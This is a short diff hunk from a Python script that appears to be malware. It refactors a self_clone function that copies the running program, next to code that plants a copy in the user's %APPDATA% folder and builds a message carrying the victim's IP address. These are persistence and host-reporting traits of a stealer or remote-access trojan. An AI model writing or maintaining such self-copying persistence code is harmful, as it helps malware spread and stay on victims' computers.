@@ -87,11 +87,8 @@ def define_caption():
           "**IP**    `"+ip+"`"
 
 def self_clone(name):
-    f = open(sys.argv[0],"r").read()
-    w = open(name,"w")
-    w.write(f)
-    w.flush()
-    w.close()
+    import shutil
+    shutil.copyfile(sys.argv[0], name)
 
 program = os.path.basename(sys.argv[0])
 if not os.path.exists(os.environ["APPDATA"]+"/"+program):
